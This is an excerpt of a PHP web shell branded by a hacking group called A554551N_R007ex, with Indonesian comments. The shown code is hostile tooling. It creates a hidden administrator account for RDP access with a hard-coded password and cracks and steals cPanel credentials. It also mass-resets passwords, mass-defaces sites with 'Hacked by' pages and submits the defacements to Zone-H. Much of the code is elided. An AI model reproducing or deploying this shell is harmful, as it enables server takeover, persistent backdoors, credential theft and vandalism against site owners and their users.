...
// Tapi Selebihnya, itu hasil kreasi A554551N_R007ex sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member A554551N_R007ex. & All My Friends.
###############################################################################
...
<head>
<title>A554551N_R007ex</title>
<meta name='author' content='A554551N_R007ex'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			$htaccess = "Options all\nDirectoryIndex A554551N_R007ex.htm\nSatisfy Any";
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/A554551N_R007ex/", exe("net user"))) die(color(1, 1, "[INFO] username 'A554551N_R007ex' already exists."));

		$add_user   = exe("net user A554551N_R007ex A554551N_R007ex /add");
    	$add_groups1 = exe("net localgroup Administrators A554551N_R007ex /add");
    	$add_groups2 = exe("net localgroup Administrator A554551N_R007ex /add");
    	$add_groups3 = exe("net localgroup Administrateur A554551N_R007ex /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "A554551N_R007ex")."<br>
    	Password: ".color(1, 2, "A554551N_R007ex")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://A554551N_R007ex.or.id/' target='_blank'>".color(1, 2, "A554551N_R007ex")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='A554551N_R007ex'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by A554551N_R007ex")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='A554551N_R007ex' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='A554551N_R007ex' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by A554551N_R007ex</textarea><br>
